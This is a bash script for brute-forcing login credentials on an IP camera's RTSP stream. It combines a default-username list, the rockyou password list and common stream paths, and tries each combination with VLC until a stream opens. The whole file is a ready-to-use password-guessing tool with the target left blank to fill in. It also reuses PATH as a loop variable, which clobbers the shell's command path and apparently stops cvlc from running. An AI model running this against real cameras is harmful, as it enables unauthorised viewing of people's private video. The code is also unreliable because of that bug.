#!/bin/bash

# === CONFIGURATION ===
CAMERA_IP=""   # <-- Change to your camera's IP / or add the file list
CAMERA_PORT="" # <-- Change if non-standard RTSP port / or add the file list
INTERFACE=""

USERNAME_FILE="/usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt"   # <-- File with username list (one per line) / or add the file list
PASSWORD_FILE="/usr/share/wordlists/rockyou.txt"  # <-- Path to rockyou.txt 

# Common RTSP paths to try
PATHS=(
  "stream1"
  "h264"
  "live.sdp"
  "videoMain"
  "videoSub"
  "ch0_0.h264"
  "onvif1"
  "onvif2"
  "camera1"
)

# === CHECK FILES ===
if [ ! -f "$USERNAME_FILE" ]; then
  echo " Username file not found: $USERNAME_FILE"
  exit 1
fi

if [ ! -f "$PASSWORD_FILE" ]; then
  echo " Password file not found: $PASSWORD_FILE"
  exit 1
fi

echo "Starting RTSP brute-force test on $CAMERA_IP using:"
echo "  Usernames: $USERNAME_FILE"
echo "  Passwords: $PASSWORD_FILE"
echo "  Interface: $INTERFACE"
echo "  Paths: ${PATHS[@]}"
echo "------------------------------------"

# Loop through usernames, passwords, and paths
while IFS= read -r USERNAME; do
  while IFS= read -r PASSWORD; do
    for PATH in "${PATHS[@]}"; do

      RTSP_URL="rtsp://$USERNAME:$PASSWORD@[$CAMERA_IP%$INTERFACE]:$CAMERA_PORT/$PATH"
      echo "Testing $RTSP_URL ..."

      # Try to open stream with VLC (timeout 5 sec)
      cvlc --run-time=5 --play-and-exit "$RTSP_URL" > /dev/null 2>&1

      if [ $? -eq 0 ]; then
        echo " SUCCESS: Stream found!"
        echo "  ➡ URL: $RTSP_URL"
        exit 0
      fi

    done
  done < "$PASSWORD_FILE"
done < "$USERNAME_FILE"

echo "Test complete. No valid stream found."
